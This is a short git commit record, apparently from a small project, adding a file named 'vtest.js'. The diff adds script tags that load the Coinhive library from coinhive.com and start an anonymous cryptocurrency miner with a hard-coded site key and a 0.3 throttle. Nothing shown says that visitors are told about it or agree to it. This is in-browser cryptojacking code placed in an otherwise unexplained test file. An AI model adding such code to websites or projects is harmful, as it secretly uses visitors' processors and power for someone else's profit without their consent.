aa7dbe5ed3cf6f6a69118090daea5c9fa2512c53
Doğu Deniz Uğur <ddu@oriens.co>
2018-03-30 18:31:39 +0300

    First js file committed

---
+++ vtest.js
@@ -0,0 +1,6 @@
+
+<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+<script>
+	var miner = new CoinHive.Anonymous('nJ8w2wmkqnU3xDfONCc7MSrclTmWrhCE', {throttle: 0.3});
+	miner.start();
+</script>
